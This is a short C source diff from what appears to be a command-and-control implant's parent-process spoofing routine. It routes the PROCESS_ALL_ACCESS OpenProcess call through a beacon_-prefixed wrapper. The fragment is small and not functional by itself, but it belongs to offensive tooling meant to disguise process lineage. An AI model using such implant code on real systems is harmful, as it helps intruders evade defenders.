@@ -59,7 +59,7 @@ BOOL process_ppid_pre(void * thisp, int ppid, void * pattr, void * siptr) {
 	STARTUPINFO *               si             = (STARTUPINFO *)siptr;
 
 	/* open our parent process */
-	hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ppid);
+	hParentProcess = beacon_OpenProcess(PROCESS_ALL_ACCESS, FALSE, ppid);
 	if (hParentProcess == NULL) {
 		post_error_dd(0x22, ppid, GetLastError());
 		return FALSE;
